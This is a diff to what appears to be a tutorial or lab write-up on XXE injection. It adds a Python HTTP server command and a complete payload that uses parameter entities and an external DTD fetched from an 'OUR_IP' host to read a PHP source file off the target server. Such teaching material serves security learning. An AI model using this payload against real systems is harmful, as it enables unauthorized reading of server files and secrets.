@@ -17,4 +17,20 @@ To bypass this, we can utilize `XML Parameter Entities`, a special type of entit
 ```xml
 <!ENTITY joined "%begin;%file;%end;">
 ```
-Then start a local server to host the file us
+Then start a local server to host the file using Python.
+```bash
+python3 -m http.server 8080
+```
+
+Now we can reference our external entity and print the `&joined` entity we defined above.
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8080/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
